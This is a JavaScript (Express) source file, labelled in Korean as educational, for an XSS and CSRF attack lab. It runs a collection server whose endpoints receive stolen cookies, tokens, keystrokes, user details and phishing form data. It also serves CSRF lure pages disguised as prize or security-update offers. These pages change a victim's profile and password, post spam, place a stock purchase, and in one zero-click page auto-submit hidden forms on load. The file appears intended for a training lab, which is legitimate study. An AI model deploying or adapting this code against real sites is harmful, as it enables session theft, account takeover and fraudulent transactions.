/**
 * 🎯 XSS 공격자 서버 (교육용)
 * 탈취된 쿠키, 토큰, 키 입력 등을 수신하고 로그로 표시
 */

const express = require('express');
const cors = require('cors');
const app = express();

// 모든 도메인에서 요청 허용 (CORS)
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 탈취된 데이터 저장소
const stolenData = [];

// 메인 페이지 - 탈취된 데이터 확인
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🎯 XSS Attacker Server</title>
      <style>
        body { background: #1a1a2e; color: #eee; font-family: monospace; padding: 20px; }
        h1 { color: #e94560; }
        .log { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #e94560; }
        .time { color: #0f3460; font-size: 12px; }
        .type { color: #e94560; font-weight: bold; }
        pre { white-space: pre-wrap; word-break: break-all; }
        .empty { color: #666; font-style: italic; }
        .clear-btn { background: #e94560; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; }
      </style>
    </head>
    <body>
      <h1>🎯 XSS Attacker Server</h1>
      <p>탈취된 데이터가 여기에 표시됩니다. (총 ${stolenData.length}개)</p>
      <form action="/clear" method="POST" style="margin-bottom: 20px;">
        <button type="submit" class="clear-btn">🗑️ 로그 초기화</button>
      </form>
      ${stolenData.length === 0 
        ? '<p class="empty">아직 탈취된 데이터가 없습니다...</p>' 
        : stolenData.map(d => `
          <div class="log">
            <div class="time">${d.time}</div>
            <div class="type">[${d.type}]</div>
            <pre>${JSON.stringify(d.data, null, 2)}</pre>
          </div>
        `).reverse().join('')}
      <script>setTimeout(() => location.reload(), 5000);</script>
    </body>
    </html>
  `);
});

// 쿠키 탈취
app.get('/steal', (req, res) => {
  const data = {
    type: 'COOKIE',
    time: new Date().toISOString(),
    data: req.query
  };
  stolenData.push(data);
  console.log('\n🍪 [COOKIE STOLEN]', req.query);
  res.send('ok');
});

// 토큰 탈취
app.get('/token', (req, res) => {
  const data = {
    type: 'TOKEN',
    time: new Date().toISOString(),
    data: req.query
  };
  stolenData.push(data);
  console.log('\n🔑 [TOKEN STOLEN]', req.query);
  res.send('ok');
});

// 키로거
app.get('/keylog', (req, res) => {
  const data = {
    type: 'KEYLOG',
    time: new Date().toISOString(),
    data: req.query
  };
  stolenData.push(data);
  console.log('\n⌨️ [KEYLOG]', req.query.key);
  res.send('ok');
});

// 사용자 정보 탈취
app.get('/userinfo', (req, res) => {
  const data = {
    type: 'USER_INFO',
    time: new Date().toISOString(),
    data: req.query
  };
  stolenData.push(data);
  console.log('\n👤 [USER INFO STOLEN]', req.query);
  res.send('ok');
});

// POST로 대량 데이터 수신
app.post('/exfil', (req, res) => {
  const data = {
    type: 'EXFILTRATION',
    time: new Date().toISOString(),
    data: req.body
  };
  stolenData.push(data);
  console.log('\n📦 [DATA EXFILTRATED]', req.body);
  res.send('ok');
});

// 피싱 폼 데이터 수신
app.all('/phish', (req, res) => {
  const data = {
    type: 'PHISHING',
    time: new Date().toISOString(),
    data: { ...req.query, ...req.body }
  };
  stolenData.push(data);
  console.log('\n🎣 [PHISHING DATA]', data.data);
  res.send('<h1>로그인 실패</h1><p>다시 시도해주세요.</p>');
});

// 로그 초기화
app.post('/clear', (req, res) => {
  stolenData.length = 0;
  console.log('\n🗑️ [LOGS CLEARED]');
  res.redirect('/');
});

// ============================================
// 🔥 CSRF 공격 페이지들
// ============================================

// CSRF 메인 페이지
app.get('/csrf', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🔥 CSRF Attack Lab</title>
      <style>
        body { background: #1a1a2e; color: #eee; font-family: monospace; padding: 20px; }
        h1 { color: #e94560; }
        h2 { color: #00d9ff; margin-top: 30px; }
        .attack-card { background: #16213e; padding: 20px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #e94560; }
        a { color: #00d9ff; }
        code { background: #0d1117; padding: 2px 6px; border-radius: 4px; }
        .warning { color: #ffa500; }
      </style>
    </head>
    <body>
      <h1>🔥 CSRF Attack Lab</h1>
      <p class="warning">⚠️ 피해자가 로그인된 상태에서 아래 링크를 클릭하게 하세요!</p>
      
      <h2>1. 프로필 정보 변경</h2>
      <div class="attack-card">
        <p>피해자의 이름과 이메일을 변경합니다</p>
        <a href="/csrf/change-profile" target="_blank">👉 공격 페이지 열기</a>
      </div>
      
      <h2>2. 비밀번호 변경</h2>
      <div class="attack-card">
        <p>피해자의 비밀번호를 <code>hacked123</code>으로 변경합니다</p>
        <a href="/csrf/change-password" target="_blank">👉 공격 페이지 열기</a>
      </div>
      
      <h2>3. 게시글 작성</h2>
      <div class="attack-card">
        <p>피해자 계정으로 게시글을 작성합니다</p>
        <a href="/csrf/create-post" target="_blank">👉 공격 페이지 열기</a>
      </div>
      
      <h2>4. 주식 매수 (위험!)</h2>
      <div class="attack-card">
        <p>피해자 계정으로 주식을 매수합니다</p>
        <a href="/csrf/buy-stock" target="_blank">👉 공격 페이지 열기</a>
      </div>
      
      <h2>5. 관심종목 추가</h2>
      <div class="attack-card">
        <p>피해자 관심종목에 특정 주식을 추가합니다</p>
        <a href="/csrf/add-watchlist" target="_blank">👉 공격 페이지 열기</a>
      </div>
      
      <h2>6. 자동 실행 (Zero-Click)</h2>
      <div class="attack-card">
        <p>페이지 로드 시 자동으로 공격이 실행됩니다</p>
        <a href="/csrf/auto-attack" target="_blank">👉 자동 공격 페이지</a>
      </div>
    </body>
    </html>
  `);
});

// CSRF: 프로필 변경
app.get('/csrf/change-profile', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>🎁 축하합니다!</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>🎁 축하합니다! 경품에 당첨되셨습니다!</h1>
      <p>아래 버튼을 클릭하여 경품을 수령하세요</p>
      <form action="http://localhost:5000/api/auth/profile" method="POST" id="csrfForm">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="name" value="HACKED_USER">
        <input type="hidden" name="email" value="hacked@attacker.com">
        <button type="submit" style="padding:20px 40px;font-size:20px;cursor:pointer">🎁 경품 받기</button>
      </form>
      <p style="color:#666;font-size:12px;margin-top:30px">(실제로는 프로필이 변경됩니다)</p>
    </body>
    </html>
  `);
});

// CSRF: 비밀번호 변경
app.get('/csrf/change-password', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>보안 업데이트</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>🔒 긴급 보안 업데이트</h1>
      <p>보안 패치를 적용하려면 아래 버튼을 클릭하세요</p>
      <form action="http://localhost:5000/api/auth/change-password" method="POST">
        <input type="hidden" name="userId" value="1">
        <input type="hidden" name="newPassword" value="hacked123">
        <button type="submit" style="padding:20px 40px;font-size:20px;cursor:pointer">🔐 보안 패치 적용</button>
      </form>
    </body>
    </html>
  `);
});

// CSRF: 게시글 작성
app.get('/csrf/create-post', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>이벤트 참여</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>🎉 이벤트 참여하기</h1>
      <form action="http://localhost:5000/api/board/posts" method="POST">
        <input type="hidden" name="userId" value="1">
        <input type="hidden" name="type" value="free">
        <input type="hidden" name="title" value="[광고] 이 주식 사면 10배 오릅니다!">
        <input type="hidden" name="content" value="<h1>급등주 정보!</h1><p>지금 바로 연락주세요: hacker@evil.com</p>">
        <button type="submit" style="padding:20px 40px;font-size:20px;cursor:pointer">🎉 참여하기</button>
      </form>
    </body>
    </html>
  `);
});

// CSRF: 주식 매수
app.get('/csrf/buy-stock', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>무료 주식 받기</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>🎁 무료 주식 1주 받기!</h1>
      <p>이벤트 기간 한정! 지금 바로 받으세요</p>
      <form action="http://localhost:5000/api/v2/trade/order" method="POST">
        <input type="hidden" name="user_id" value="1">
        <input type="hidden" name="symbol" value="GME">
        <input type="hidden" name="side" value="buy">
        <input type="hidden" name="quantity" value="100">
        <input type="hidden" name="price" value="50000">
        <button type="submit" style="padding:20px 40px;font-size:20px;cursor:pointer">🎁 무료 주식 받기</button>
      </form>
    </body>
    </html>
  `);
});

// CSRF: 관심종목 추가
app.get('/csrf/add-watchlist', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>추천 종목</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>📈 오늘의 추천 종목</h1>
      <form action="http://localhost:5000/api/market/watchlist" method="POST">
        <input type="hidden" name="user_id" value="1">
        <input type="hidden" name="symbol" value="SCAM">
        <input type="hidden" name="name" value="사기코인">
        <button type="submit" style="padding:20px 40px;font-size:20px;cursor:pointer">📌 관심종목 추가</button>
      </form>
    </body>
    </html>
  `);
});

// CSRF: 자동 실행 (Zero-Click)
app.get('/csrf/auto-attack', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>로딩중...</title></head>
    <body style="background:#1a1a2e;color:#eee;text-align:center;padding:50px">
      <h1>⏳ 페이지 로딩중...</h1>
      <p>잠시만 기다려주세요</p>
      
      <!-- 숨겨진 iframe들로 자동 공격 -->
      <iframe name="csrf1" style="display:none"></iframe>
      <iframe name="csrf2" style="display:none"></iframe>
      <iframe name="csrf3" style="display:none"></iframe>
      
      <!-- 프로필 변경 -->
      <form action="http://localhost:5000/api/auth/profile" method="POST" target="csrf1" id="form1">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="name" value="PWNED">
        <input type="hidden" name="email" value="pwned@hacker.com">
      </form>
      
      <!-- 게시글 작성 -->
      <form action="http://localhost:5000/api/board/posts" method="POST" target="csrf2" id="form2">
        <input type="hidden" name="userId" value="1">
        <input type="hidden" name="type" value="free">
        <input type="hidden" name="title" value="CSRF로 작성된 게시글">
        <input type="hidden" name="content" value="이 게시글은 CSRF 공격으로 자동 작성되었습니다!">
      </form>
      
      <!-- 관심종목 추가 -->
      <form action="http://localhost:5000/api/market/watchlist" method="POST" target="csrf3" id="form3">
        <input type="hidden" name="user_id" value="1">
        <input type="hidden" name="symbol" value="CSRF">
        <input type="hidden" name="name" value="CSRF공격종목">
      </form>
      
      <script>
        // 페이지 로드 시 자동으로 모든 폼 제출
        document.getElementById('form1').submit();
        setTimeout(() => document.getElementById('form2').submit(), 500);
        setTimeout(() => document.getElementById('form3').submit(), 1000);
        setTimeout(() => {
          document.body.innerHTML = '<h1 style="color:#00ff00">✅ 완료!</h1><p>원래 페이지로 이동합니다...</p>';
          setTimeout(() => window.location = 'https://google.com', 2000);
        }, 2000);
      </script>
    </body>
    </html>
  `);
});

const PORT = 4000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  ╔═══════════════════════════════════════════════════════════╗
  ║  🎯 XSS Attacker Server                                   ║
  ║  Running on http://localhost:${PORT}                         ║
  ║                                                           ║
  ║  Endpoints:                                               ║
  ║  GET  /steal?cookie=...   - Cookie stealing               ║
  ║  GET  /token?token=...    - Token stealing                ║
  ║  GET  /keylog?key=...     - Keylogger                     ║
  ║  GET  /userinfo?...       - User info stealing            ║
  ║  POST /exfil              - Data exfiltration             ║
  ║  ALL  /phish              - Phishing form capture         ║
  ╚═══════════════════════════════════════════════════════════╝
  `);
});
